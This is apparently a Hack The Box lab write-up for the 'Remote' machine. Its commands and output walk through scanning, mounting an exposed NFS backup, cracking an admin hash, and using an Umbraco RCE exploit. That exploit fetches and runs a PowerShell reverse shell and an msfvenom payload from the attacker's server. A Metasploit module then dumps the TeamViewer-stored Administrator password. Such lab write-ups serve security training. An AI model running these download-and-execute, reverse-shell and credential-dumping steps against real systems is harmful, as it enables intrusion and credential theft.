```console
kali@kali:~/impacket/examples$ nmap -Pn -T4 remote.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 17:48 EDT
Warning: 10.10.10.180 giving up on port because retransmission cap hit (6).
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.071s latency).
Not shown: 600 closed ports, 394 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
111/tcp open  rpcbind
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
kali@kali:~/impacket/examples$ nmap -p21,80,111,135,139,445 -A --script vuln -Pn -T4 remote.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 18:33 EDT
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.19s latency).

PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
80/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
111/tcp open  rpcbind       2-4 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp open  msrpc         Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 598.75 seconds
```
http://remote.htb/install
http://remote.htb/people
http://remote.htb/about-us/todo-list-for-the-starter-kit/
http://remote.htb/umbraco/#/login/false?returnPath=%252Fforms

```console
kali@kali:~$ nmap -p111 --script=nfs-showmount -Pn  remote.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 19:52 EDT
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.064s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /site_backups 

Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
kali@kali:~/HTB/remote$ sudo mount -t nfs remote.htb:/site_backups site_backups/
```
to find out any password I ran
```
kali@kali:~/HTB/remote/site_backups$ grep -iRl "password"
```
this command show many interesting files such as, logs. After enumerating logs I found:
- password need to be at least 10 char
- user account ```admin@htb.local``` fron logs
```console
2020-02-19 23:11:08,292 [P4408/D12/T40] INFO  Umbraco.Core.Security.BackOfficeSignInManager - Event Id: 0, state: Login attempt succeeded for username admin@htb.local from IP address 192.168.195.137
2020-02-19 23:28:54,043 [P4408/D15/T45] INFO  Umbraco.Core.Security.BackOfficeSignInManager - Event Id: 0, state: Login attempt failed for username Admin from IP address 192.168.195.1
```


I then decided to find out more about *admin@htb.local* or *Admin*
```console
kali@kali:~/HTB/remote/site_backups$ grep -iRl "admin@htb.local" .
./App_Data/Logs/UmbracoTraceLog.intranet.txt
./App_Data/Logs/UmbracoTraceLog.intranet.txt.2020-02-19
./App_Data/Logs/UmbracoTraceLog.remote.txt
./App_Data/Umbraco.sdf
```
The frist 3 files were logs which didnt contain much juicy stuff. just user log in log. On the another hand, ```.sdf```....
```console
ali@kali:~/HTB/remote/site_backups$ strings ./App_Data/Umbraco.sdf | grep "admin@htb.local"
adminadmin@htb.localHASHHEREWHICHIWILLNOTTELLYOU{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localHASHHEREWHICHIWILLNOTTELLYOU{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
```
bingo !! I then use this web to crack the hash https://crackstation.net/.


Now visit http://remote.htb/umbraco/ and try to log in with the cerdential we got. this is what I found on the web
- another username call ```ssmith@htb.local```
  - I can change his password

anyhow this is not taking me anywhere, I then search for [Umbraco CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-15064/Umbraco.html). There are many cves but we are aiming for remote code execution or RCE, which lead us to [CVE-2013-4793](https://www.cvedetails.com/cve/CVE-2013-4793/). After digging aroud on google and github I found [this](https://github.com/noraj/Umbraco-RCE) that might do the work


Git clone the repo and make sure that u have all modules that the tool is requrired, else use pip3 to download everything. My plan is use the exploit to create a reverse shell so it might be easier for me too do stuff. 
```console
kali@kali:~/HTB/remote$ git clone https://github.com/noraj/Umbraco-RCE.git
kali@kali:~/HTB/remote$ cd Umbraco-RCE/
kali@kali:~/HTB/remote/Umbraco-RCE$ pip3 XXX # install all requriments
kali@kali:~/HTB/remote/Umbraco-RCE$ python3 exploit.py -u admin@htb.local -p <passowd> -i 'http://remote.htb' -c powershell.exe -a "dir"
```
It works!!

```console
kali@kali:~/HTB/remote$ wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1 -O shell.ps1 # download shell script DONT FORGET to fix IP and port
kali@kali:~/HTB/remote$ python -m SimpleHTTPServer 8000 # run the server on anther tab
kali@kali:~/HTB/remote$ nc -nvlp 1234 # run netcat and listent to port
kali@kali:~/HTB/remote/Umbraco-RCE$ python3 exploit.py -u admin@htb.local -p <passowd> -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object System.Net.WebClient).DownloadString('http://ip:port/shell.ps1')" # get the shell!!
```

now let try to get user flag
```cmd

    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/19/2020   3:12 PM                .NET v2.0                                                             
d-----        2/19/2020   3:12 PM                .NET v2.0 Classic                                                     
d-----        2/19/2020   3:12 PM                .NET v4.5                                                             
d-----        2/19/2020   3:12 PM                .NET v4.5 Classic                                                     
d-----        6/20/2020   5:36 PM                Administrator                                                         
d-----        2/19/2020   3:12 PM                Classic .NET AppPool                                                  
d-r---        6/20/2020   6:30 PM                Public                                                                
d-----        6/20/2020   5:54 PM                TheAdmin                                                              



ls TheAdmin

ls Administrator

ls Public       


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        2/19/2020   3:03 PM                Documents                                                             
d-r---        6/20/2020   6:33 PM                Downloads                                                             
d-----        6/20/2020   5:39 PM                Microsoft                                                             
d-r---        9/15/2018   3:19 AM                Music                                                                 
d-r---        9/15/2018   3:19 AM                Pictures                                                              
d-r---        9/15/2018   3:19 AM                Videos                                                                
-ar---        6/20/2020   5:36 PM             34 user.txt                                                              
```

now is time for PrivEsc which is one of my weakness. From Sauna, I learn how to use ```winPEAS.bat``` so the plan is try to use it to find out more about the target. use simplehttpserver to host ```winPEAS.bat```, how use ```invoke-webrequest -Uri http://10.10.14.83:8000/winPEAS.bat -OutFile C:\Users\Public\Downloads\winPEAS.bat```. You will find a lot of info by using winPEAS. Here is something I found that looks interesting.

```cmd
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] INSTALLED SOFTWARE <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Some weird software? Check for vulnerabilities in unknow software installed
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
Common Files
Common Files
internet explorer
Internet Explorer
Microsoft SQL Server
Microsoft SQL Server
Microsoft.NET
MSBuild
MSBuild
Reference Assemblies
Reference Assemblies
TeamViewer
VMware
Windows Defender
Windows Defender
Windows Defender Advanced Threat Protection
Windows Mail
Windows Mail
Windows Media Player
Windows Media Player
Windows Multimedia Platform
Windows Multimedia Platform
windows nt
windows nt
Windows Photo Viewer
Windows Photo Viewer
Windows Portable Devices
Windows Portable Devices
Windows Security
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
    InstallLocation    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] RUNNING PROCESSES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Something unexpected is running? Check for vulnerabilities
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
Registry                       104 N/A                                         
smss.exe                       320 N/A                                         
csrss.exe                      400 N/A                                         
wininit.exe                    480 N/A                                         
csrss.exe                      528 N/A                                         
winlogon.exe                   580 N/A                                         
services.exe                   588 N/A                                         
lsass.exe                      644 KeyIso, SamSs                               
svchost.exe                    760 PlugPlay                                    
svchost.exe                    792 BrokerInfrastructure, DcomLaunch, Power,    
                                   SystemEventsBroker                          
fontdrvhost.exe                812 N/A                                         
fontdrvhost.exe                820 N/A                                         
svchost.exe                    916 RpcEptMapper, RpcSs                         
svchost.exe                    960 LSM                                         
dwm.exe                       1020 N/A                                         
svchost.exe                    356 DsmSvc                                      
svchost.exe                    908 NcbService                                  
svchost.exe                   1036 TimeBrokerSvc                               
svchost.exe                   1108 EventLog                                    
svchost.exe                   1156 CoreMessagingRegistrar                      
svchost.exe                   1268 nsi                                         
svchost.exe                   1300 gpsvc                                       
svchost.exe                   1336 Dhcp                                        
vmacthlp.exe                  1404 VMware Physical Disk Helper Service         
svchost.exe                   1464 Schedule                                    
svchost.exe                   1492 NlaSvc                                      
svchost.exe                   1524 ProfSvc                                     
svchost.exe                   1540 EventSystem                                 
svchost.exe                   1548 Themes                                      
svchost.exe                   1704 SENS                                        
svchost.exe                   1732 netprofm                                    
svchost.exe                   1784 Wcmsvc                                      
svchost.exe                   1792 Dnscache                                    
svchost.exe                   1928 ShellHWDetection                            
svchost.exe                   1980 UserManager                                 
svchost.exe                   2024 FontCache                                   
svchost.exe                   1308 WinHttpAutoProxySvc                         
svchost.exe                   2068 BFE, mpssvc                                 
svchost.exe                   2120 LanmanWorkstation                           
svchost.exe                   2252 PolicyAgent                                 
svchost.exe                   2264 IKEEXT                                      
spoolsv.exe                   2664 Spooler                                     
svchost.exe                   2728 AppHostSvc                                  
svchost.exe                   2736 CryptSvc                                    
svchost.exe                   2744 DiagTrack                                   
svchost.exe                   2760 ftpsvc                                      
inetinfo.exe                  2784 IISADMIN                                    
svchost.exe                   2796 Winmgmt                                     
svchost.exe                   2864 SstpSvc                                     
svchost.exe                   2948 SysMain                                     
svchost.exe                   2988 TrkWks                                      
svchost.exe                   2996 LanmanServer                                
VGAuthService.exe             3004 VGAuthService                               
vmtoolsd.exe                  3024 VMTools                                     
TeamViewer_Service.exe        3036 TeamViewer7                                 
svchost.exe                   3068 W3SVC, WAS                                  
svchost.exe                   2076 W32Time                                     
svchost.exe                   2176 WinRM                                       
MsMpEng.exe                   2260 WinDefend                                   
svchost.exe                   3108 WpnService                                  
nfssvc.exe                    3160 NfsService                                  
svchost.exe                   3184 iphlpsvc                                    
svchost.exe                   3504 RasMan                                      
dllhost.exe                   3404 COMSysApp                                   
msdtc.exe                     4304 MSDTC                                       
LogonUI.exe                   4792 N/A                                         
WmiPrvSE.exe                  4916 N/A                                         
svchost.exe                   5768 lmhosts                                     
w3wp.exe                      1884 N/A                                         
powershell.exe                6056 N/A                                         
conhost.exe                   6044 N/A                                         
svchost.exe                   4264 CDPSvc                                      
svchost.exe                    728 DPS                                         
svchost.exe                   5608 UALSVC                                      
svchost.exe                   5448 UsoSvc                                      
SearchIndexer.exe             5424 WSearch                                     
svchost.exe                   5112 StateRepository                             
svchost.exe                   5272 DsSvc                                       
svchost.exe                   4728 WdiSystemHost                               
svchost.exe                   5668 PcaSvc                                      
powershell.exe                1032 N/A                                         
conhost.exe                   2208 N/A                                         
svchost.exe                   4968 wuauserv                                    
WmiPrvSE.exe                  2840 N/A                                         
cmd.exe                       5748 N/A                                         
WmiPrvSE.exe                  4188 N/A                                         
TrustedInstaller.exe          4412 TrustedInstaller                            
TiWorker.exe                  4460 N/A                                         
tasklist.exe                  4484 N/A                                         



_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ADMINISTRATORS GROUPS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] SERVICE BINARY PERMISSIONS WITH WMIC + ICACLS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)

C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe NT SERVICE\TrustedInstaller:(F)

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)

C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe NT AUTHORITY\SYSTEM:(I)(F)

C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(F)

C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(F)

C:\Program Files\VMware\VMware Tools\vmacthlp.exe BUILTIN\Administrators:(F)

C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe BUILTIN\Administrators:(F)

C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe BUILTIN\Administrators:(F)

C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1911.3-0\NisSrv.exe APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1911.3-0\MsMpEng.exe APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Windows Media Player\wmpnetwk.exe NT SERVICE\TrustedInstaller:(F)
```

As you can see, TeamViewer is intalled on the machine. Moreover, TeamViewer is one of the running process and it run as **NT AUTHORITY\SYSTEM** or **root**. Also, the name of this room is Remote so I was "sure" that TeamViewer is the key.


After diging around. I found [this](https://github.com/rapid7/metasploit-framework/pull/13154) and it seem like msfconsole will be the prefect solution. Moreover, I didnt like ```mini-reverse.ps1``` that we used to get user flag. So to use this expliot we need to get meterpreter shell on the machine. Here is what I did.

```console
msf5 use multi/handler
msf5 exploit(multi/handler)
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.230.141   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.15.178:1234 
```
wait and listen for our reverse shell. Now let create shell using ```msfvenom```

```console
kali@kali:~/HTB/remote$ msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=1234 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

now use simplehttpserver and use the ```Umbraco-RCE``` to download and execute our reverse shell.
```console
kali@kali:~/HTB/remote$ python -m SimpleHTTPServer 8000
kali@kali:~/HTB/remote/Umbraco-RCE$ python3 exploit.py -u admin@htb.local -p password -i 'http://remote.htb' -c powershell.exe -a "Invoke-WebRequest -Uri http://10.10.15.178:8000/shell.exe -OutFile C:/Users/Public/Downloads/shell.exe" # dowload the shell from our server
kali@kali:~/HTB/remote/Umbraco-RCE$ python3 exploit.py -u admin@htb.local -p password -i 'http://remote.htb' -c cmd.exe -a "/c C:/Users/Public/Downloads/shell.exe" # execute the shell using cmd.exe
```
now check our meterpreter.

```console
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.15.178:1234 
[*] Sending stage (176195 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.15.178:1234 -> 10.10.10.180:49739) at 2020-06-23 13:46:03 -0400
[*] Sending stage (176195 bytes) to 10.10.10.180
[*] Meterpreter session 2 opened (10.10.15.178:1234 -> 10.10.10.180:49732) at 2020-06-23 13:46:04 -0400
```
so the plan is using expliot that we found earlier. incase you dont have it, do this (it might help)

```console
kali@kali:~/HTB/remote$ sudo apt update; sudo  apt install metasploit-framework # updating metasploit-framework
$ # still didnt work? try this
kali@kali:~/HTB/remote$ cd /usr/share/metasploit-framework/modules/post/windows/gather/credentials/
kali@kali:/usr/share/metasploit-framework/modules/post/windows/gather/credentials$ sudo wget https://raw.githubusercontent.com/rapid7/metasploit-framework/6557cabd658748f4e66331fc4ae03fc2f6f7f616/modules/post/windows/gather/credentials/teamviewer_passwords.rb
```

now background out meterpreter session by runing ```bg``` or press ```ctrl+d```
```console

meterpreter > [*] Shutting down Meterpreter... # ctrl + d to background our meterpreter

[*] 10.10.10.180 - Meterpreter session 2 closed.  Reason: User exit
msf5 exploit(multi/handler) > search teamview

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  post/windows/gather/credentials/teamviewer_passwords                   normal  No     Windows Gather TeamViewer Passwords


msf5 exploit(multi/handler) > use 0
msf5 post(windows/gather/credentials/teamviewer_passwords) > opstion
[-] Unknown command: opstion.
msf5 post(windows/gather/credentials/teamviewer_passwords) > options 

Module options (post/windows/gather/credentials/teamviewer_passwords):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   SESSION                        yes       The session to run this module on.
   WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer

msf5 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 0
SESSION => 0
msf5 post(windows/gather/credentials/teamviewer_passwords) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x86/windows  IIS APPPOOL\DefaultAppPool @ REMOTE  10.10.15.178:1234 -> 10.10.10.180:49739 (10.10.10.180)

msf5 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 1
SESSION => 1
msf5 post(windows/gather/credentials/teamviewer_passwords) > run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: PASSWORDISSOMETHING
[+] Passwords stored in: /home/kali/.msf4/loot/20200623134706_default_10.10.10.180_host.teamviewer__824375.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
[*] Post module execution completed
msf5 post(windows/gather/credentials/teamviewer_passwords) >
```
Bingo we found a possword! I do belive that the password is belong to the Administrator. Now let use evil shell to gain root access.
```console
kali@kali:~$ evil-winrm -i remote.htb -u 'Administrator' -p 'PASSWORDISSOMETHING'
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/23/2020   2:04 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```